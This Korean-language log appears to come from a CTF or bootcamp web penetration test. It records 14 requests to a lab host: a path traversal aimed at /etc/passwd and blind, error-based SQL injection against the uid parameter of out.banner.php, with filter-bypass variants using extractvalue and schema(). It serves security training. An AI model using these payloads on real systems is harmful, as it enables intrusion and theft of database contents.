# 보낸 요청 전체 (All Requests) — bootcamp-ctf-web

이 Control이 실행 중 실제로 전송한 모든 요청을, 요약이 아니라 순서 그대로 생략 없이
기록한다. 각 요청의 결과는 `all-results.md`에 같은 순서·같은 번호로 대응시킨다.

## 요청 1 — CTL-RECON-001 (핑거프린팅)

```
GET / HTTP/1.1
Host: 100.121.79.125
```

- 왜 이 값을 썼는지: 대상 서비스/버전 식별을 위한 최초 baseline 요청.

## 요청 2 — CTL-RECON-003 (에러 노출 확인)

```
GET /wizmart.php?query=option&optionvalue=2 HTTP/1.1
Host: 100.121.79.125
```

- 왜 이 값을 썼는지: 메인 페이지에 노출된 실제 링크(`wizmart.php?query=option&optionvalue=2`)를
  그대로 따라가 정상 동작/에러 노출 여부 확인.

## 요청 3 — CTL-RECON-004 (wizhtml.php LFI/traversal 시도)

```
GET /wizhtml.php?html=../../../../../../etc/passwd HTTP/1.1
Host: 100.121.79.125
```

- 왜 이 값을 썼는지: `html` 파라미터가 파일 include에 쓰이는지 확인하기 위한 표준
  path traversal 페이로드. (동일 목적으로 `....//`, `..%2f`, null byte, `php://filter`
  변형도 시도 — 결과는 전부 동일하게 차단되어 대표 1건만 기록)

## 요청 4 — CTL-RECON-007 (wizboard.php BID 인젝션 시도)

```
GET /wizboard.php?BID=board01%27&GID=root HTTP/1.1
Host: 100.121.79.125
```

- 왜 이 값을 썼는지: `BID` 파라미터가 게시판 폴더명을 그대로 조립하는 구조로 보여
  quote 삽입으로 필터/화이트리스트 존재 여부 확인.

## 요청 5 — CTL-RECON-008 (wizsearch.php keyword 인젝션 시도)

```
GET /wizsearch.php?query=search&Target=all&keyword=%27 HTTP/1.1
Host: 100.121.79.125
```

- 왜 이 값을 썼는지: 검색어 파라미터가 SQL 쿼리에 직접 들어가는지 확인, quote 삽입.

## 요청 6 — CTL-EXPLOIT-001 (out.banner.php uid — baseline true)

```
GET /lib/out.banner.php?uid=1 HTTP/1.1
Host: 100.121.79.125
```

- 왜 이 값을 썼는지: 배너 트래킹 스크립트의 `uid`가 숫자형으로 SQL에 직접 들어가는지
  확인하기 위한 정상값 baseline.

## 요청 7 — CTL-EXPLOIT-002 (out.banner.php uid — 존재하지 않는 값)

```
GET /lib/out.banner.php?uid=99999 HTTP/1.1
Host: 100.121.79.125
```

- 왜 이 값을 썼는지: 정상 동작에서 "레코드 없음"일 때의 응답 패턴을 baseline으로 확보.

## 요청 8 — CTL-EXPLOIT-003 (boolean-based blind 참 조건)

```
GET /lib/out.banner.php?uid=1%20AND%201=1 HTTP/1.1
Host: 100.121.79.125
```

- 왜 이 값을 썼는지: 숫자형 파라미터에 SQL 조건절을 그대로 이어 붙여 boolean-based
  blind SQLi 성립 여부 확인 (참 조건).

## 요청 9 — CTL-EXPLOIT-004 (boolean-based blind 거짓 조건)

```
GET /lib/out.banner.php?uid=1%20AND%201=2 HTTP/1.1
Host: 100.121.79.125
```

- 왜 이 값을 썼는지: 요청 8과 동일 구조에서 조건만 거짓으로 바꿔 응답 차이(Location
  헤더 유무)가 조건에 종속되는지 확인.

## 요청 10 — CTL-EXPLOIT-005 (error-based, SUBSTRING — 필터에 막힘)

```
GET /lib/out.banner.php?uid=1%20AND%20SUBSTRING(VERSION(),1,1)=5 HTTP/1.1
Host: 100.121.79.125
```

- 왜 이 값을 썼는지: MySQL 버전 확인을 위한 표준 error-based 페이로드. 이 시도에서
  서버가 SQL 에러 메시지에 실행된 쿼리 원문을 그대로 반환하는 것을 처음 확인함.

## 요청 11 — CTL-EXPLOIT-006 (error-based, extractvalue — MySQL 버전 추출)

```
GET /lib/out.banner.php?uid=1%20AND%20extractvalue(1,concat(0x7e,version())) HTTP/1.1
Host: 100.121.79.125
```

- 왜 이 값을 썼는지: 요청 10에서 `SUBSTRING`이 필터(공백 삽입)로 깨진 것을 확인한 뒤,
  필터에 걸리지 않는 다른 error-based 함수(`extractvalue`)로 우회 가능한지 확인.

## 요청 12 — CTL-EXPLOIT-007 (error-based, updatexml — 필터에 막힘)

```
GET /lib/out.banner.php?uid=1%20AND%20updatexml(1,concat(0x7e,database()),1) HTTP/1.1
Host: 100.121.79.125
```

- 왜 이 값을 썼는지: `updatexml` 함수와 `database()` 함수도 필터를 우회하는지 대조
  확인 (결과: 둘 다 필터에 걸림 — `up datexml`, `data base`로 공백 삽입됨).

## 요청 13 — CTL-EXPLOIT-008 (error-based, user() 추출)

```
GET /lib/out.banner.php?uid=1%20AND%20extractvalue(1,concat(0x7e,user())) HTTP/1.1
Host: 100.121.79.125
```

- 왜 이 값을 썼는지: `extractvalue`가 필터를 우회함을 확인했으니, `database()` 대신
  같은 정보를 얻을 수 있는 `user()`로 DB 계정 정보 추출 시도.

## 요청 14 — CTL-EXPLOIT-009 (error-based, schema() 추출 — database() 우회)

```
GET /lib/out.banner.php?uid=1%20AND%20extractvalue(1,concat(0x7e,schema())) HTTP/1.1
Host: 100.121.79.125
```

- 왜 이 값을 썼는지: `database()` 리터럴 문자열이 필터에 걸리므로, 동일 기능의
  동의어 함수 `schema()`로 필터 우회 후 현재 스키마명 추출 시도. 이 이상(테이블/컬럼/
  실제 회원 데이터)은 Scope의 "Credential 수집 금지"에 해당해 진행하지 않음.

## 관련 파일

- 결과: `evidence/all-results.md`
- 원본 구조화 기록: `execution/vulnerable.json`, `execution/patched.json`
